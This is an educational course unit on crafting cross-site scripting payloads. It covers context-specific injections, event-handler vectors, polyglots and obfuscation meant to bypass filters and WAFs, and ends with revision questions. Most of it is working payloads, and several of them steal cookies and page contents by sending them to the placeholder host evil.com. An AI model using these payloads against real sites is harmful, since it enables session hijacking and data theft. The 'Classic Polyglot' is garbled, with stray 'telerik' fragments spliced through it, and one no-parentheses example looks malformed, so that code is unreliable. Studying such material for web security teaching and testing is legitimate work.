# Unit 6: Cross-Site Scripting (XSS) — Topic 3: Payload Crafting

## Overview

Crafting effective XSS payloads is both a science and an art. A successful payload must escape the rendering context, avoid filters and encoding, and execute meaningful JavaScript in the victim's browser. This topic progresses from basic payloads to advanced techniques including context-specific injections, event handler abuse, polyglot payloads, and obfuscation methods that bypass modern defences.

---

## 1. Basic XSS Payloads

### 1.1 Classic Script Tag

```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

### 1.2 Image Tag with Event Handler

```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert(document.cookie)">
<img/src=x onerror=alert(1)>
```

### 1.3 SVG-Based

```html
<svg onload=alert(1)>
<svg/onload=alert(document.domain)>
<svg><script>alert(1)</script></svg>
```

### Payload Progression

```
Level 1 (Proof of Concept)     →  alert(1)
Level 2 (Info Disclosure)      →  alert(document.domain)
Level 3 (Cookie Access)        →  alert(document.cookie)
Level 4 (Data Exfiltration)    →  fetch('https://evil.com/?c='+document.cookie)
Level 5 (Full Exploitation)    →  Load external script for persistent control
```

---

## 2. Context-Specific Payloads

### 2.1 HTML Body Context

Your input is placed directly in the HTML body between tags.

```
Injection Point:  <div>USER_INPUT</div>

Payloads:
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <details open ontoggle=alert(1)>
  <marquee onstart=alert(1)>
  <body onload=alert(1)>
```

### 2.2 HTML Attribute Context

Your input is reflected inside an HTML attribute value.

```
Injection Point:  <input value="USER_INPUT">

Strategy: Close the attribute, add event handler

Payloads:
  " onfocus=alert(1) autofocus="
  " onmouseover=alert(1) "
  "><script>alert(1)</script>
  " accesskey="x" onclick="alert(1)" x="
  '/onfocus=alert(1)/autofocus='

Injection Point:  <a href="USER_INPUT">

Payloads:
  javascript:alert(1)
  javascript:alert(document.domain)
  javascript:fetch('//evil.com/?c='+document.cookie)
```

### 2.3 JavaScript String Context

Your input lands inside a JavaScript string literal.

```
Injection Point:  <script>var x = "USER_INPUT";</script>

Strategy: Break out of the string, inject code

Payloads:
  ";alert(1);//
  "-alert(1)-"
  ";alert(1)//
  \";alert(1);//
  </script><script>alert(1)//

Injection Point:  <script>var x = 'USER_INPUT';</script>

Payloads:
  '-alert(1)-'
  ';alert(1);//
```

### 2.4 JavaScript Template Literal Context

```
Injection Point:  <script>var x = `USER_INPUT`;</script>

Payloads:
  ${alert(1)}
  ${alert(document.domain)}
  ${fetch('//evil.com/?c='+document.cookie)}
```

### Context Decision Diagram

```
Where does input appear?
  |
  |-- In HTML body        --> Inject new tags: <img>, <svg>, <script>
  |
  |-- In an attribute     --> Close attribute, add event handler
  |     |
  |     |-- href/src      --> javascript: protocol
  |     |-- value/title   --> " onfocus=... autofocus="
  |
  |-- In JavaScript       --> Break string, inject code
  |     |
  |     |-- Double-quoted --> ";alert(1);//
  |     |-- Single-quoted --> ';alert(1);//
  |     |-- Template lit  --> ${alert(1)}
  |
  |-- In URL parameter    --> Encode and inject
  |
  |-- In CSS              --> expression() or url() based injection
```

---

## 3. Event Handler Payloads

HTML event handlers are a rich source of XSS vectors, especially when `<script>` tags are blocked.

| Event Handler      | Element(s)              | Trigger                        |
|--------------------|-------------------------|--------------------------------|
| `onerror`          | `<img>`, `<video>`      | Resource fails to load         |
| `onload`           | `<svg>`, `<body>`       | Element loads                  |
| `onfocus`          | `<input>`, `<textarea>` | Element receives focus         |
| `onmouseover`      | Any visible element     | Mouse hovers over element      |
| `onclick`          | Any visible element     | User clicks element            |
| `ontoggle`         | `<details>`             | Element is toggled open        |
| `onanimationend`   | Any styled element      | CSS animation completes        |
| `onpointerenter`   | Any visible element     | Pointer enters element         |
| `onauxclick`       | Any clickable element   | Non-primary button click       |

### Less Common but Effective Handlers

```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<meter onmouseover=alert(1)>0</meter>
```

---

## 4. Polyglot Payloads

Polyglot payloads are designed to execute across multiple contexts. A single payload that works in HTML, attribute, and JS contexts is invaluable when the exact context is uncertain.

### Classic Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0telerik%telerikd%telerikn/telerik1telerik//telerik</telerikstTelerikYLE/t]telerik/telerik>telerik[telerik/telerik<telerik'telerik";alert(1)//';alert(1)//";alert(1)//--></SCRIPT>">'><SCRIPT>alert(1)</SCRIPT>
```

### Simplified Polyglot Examples

```html
'-alert(1)-'
"onmouseover=alert(1)//
"><img src=x onerror=alert(1)>
javascript:alert(1)//";alert(1)//';alert(1)//`alert(1)`
```

### Polyglot Logic

```
Payload Target Matrix:
  +------------------+-------+-------+-------+-------+
  | Payload          | HTML  | Attr  | JS "" | JS '' |
  +------------------+-------+-------+-------+-------+
  | '-alert(1)-'     |  No   |  No   |  No   |  YES  |
  | "-alert(1)-"     |  No   |  No   |  YES  |  No   |
  | <img src=x       |  YES  |  YES  |  No   |  No   |
  |  onerror=alert>  |       |       |       |       |
  | Full polyglot    |  YES  |  YES  |  YES  |  YES  |
  +------------------+-------+-------+-------+-------+
```

---

## 5. Obfuscation Techniques

### 5.1 Character Encoding

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- Unicode escapes in JS -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### 5.2 String Construction

```javascript
// eval with String.fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// atob (Base64 decode)
eval(atob('YWxlcnQoMSk='))

// Array join
[]['constructor']['constructor']('alert(1)')()
```

### 5.3 JavaScript Alternatives to alert()

```javascript
// When alert is blocked
confirm(1)
prompt(1)
console.log(document.cookie)
window['al'+'ert'](1)
top['al'+'ert'](1)
self['alert'](1)
globalThis.alert(1)
```

### 5.4 Tag and Attribute Obfuscation

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Newlines and tabs in tag names -->
<img/src=x	onerror=alert(1)>

<!-- Null bytes (older browsers) -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Slash instead of space -->
<img/src=x/onerror=alert(1)>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
```

---

## 6. Advanced Payload Techniques

### 6.1 No Parentheses

```html
<img src=x onerror=alert`1`>
<img src=x onerror=throw/a]alert(1)//>
<svg onload=location='javascript:alert%281%29'>
```

### 6.2 No Quotes and No Spaces

```html
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
```

### 6.3 Using Constructor

```javascript
// Without named functions
[].constructor.constructor('alert(1)')()
''['constructor']['constructor']('alert(1)')()
```

### 6.4 Data Exfiltration Payload

```javascript
fetch('https://evil.com/collect',{
  method:'POST',
  body:JSON.stringify({
    cookie:document.cookie,
    url:location.href,
    dom:document.body.innerHTML.substring(0,1000)
  })
})
```

---

## Summary Table

| Technique               | Use Case                                | Example                          |
|-------------------------|-----------------------------------------|----------------------------------|
| Script tag              | Simplest HTML body injection            | `<script>alert(1)</script>`     |
| Event handlers          | When `<script>` is blocked             | `<img src=x onerror=alert(1)>` |
| Attribute breakout      | Input inside HTML attribute             | `" onfocus=alert(1) "`         |
| JS string breakout      | Input inside JS string literal          | `";alert(1);//`                |
| Template literal inject | Input inside backtick strings           | `${alert(1)}`                  |
| Polyglot                | Unknown or multiple contexts            | Multi-context payload           |
| Encoding / obfuscation  | Bypassing filters and WAFs              | HTML entities, fromCharCode     |
| Constructor chains      | Bypassing function name blacklists      | `[].constructor.constructor()` |

---

## Revision Questions

1. **Your input is reflected inside `<input value="USER_INPUT">`. Craft a payload that executes without user interaction and explain why it works.**

2. **What is the advantage of a polyglot payload over a context-specific payload?**

3. **Explain how `eval(atob('YWxlcnQoMSk='))` achieves code execution and why it might bypass a WAF.**

4. **You find that `<script>` tags and the word `alert` are blacklisted. Propose two alternative payloads.**

5. **Why might an attacker use `String.fromCharCode()` instead of writing JavaScript keywords directly?**

6. **Describe the progression from a proof-of-concept XSS payload to a weaponised data exfiltration payload. What changes at each stage?**

---

*Previous: [02-xss-detection.md](02-xss-detection.md) | Next: [04-filter-bypass-techniques.md](04-filter-bypass-techniques.md)*

---

*[Back to README](../README.md)*
